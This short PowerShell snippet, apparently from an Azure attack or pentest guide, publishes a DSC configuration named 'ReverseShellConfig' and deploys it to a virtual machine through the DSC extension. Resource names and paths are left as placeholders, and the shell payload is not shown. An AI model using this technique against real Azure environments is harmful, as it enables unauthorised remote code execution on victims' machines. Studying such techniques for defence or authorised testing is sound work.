# Match with your resource names
$resourceGroup = ' '
$vmName = ' '
$storageName = ' '

Publish-AzVMDscConfiguration -ConfigurationPath <path to config file> -ResourceGroupName $resourceGroup -StorageAccountName $storageName -force
Set-AzVMDscExtension -Version '2.80' -ResourceGroupName $resourceGroup -VMName $vmName -ArchiveStorageAccountName $storageName -ArchiveBlobName '<name your file>' -AutoUpdate -ConfigurationName 'ReverseShellConfig'
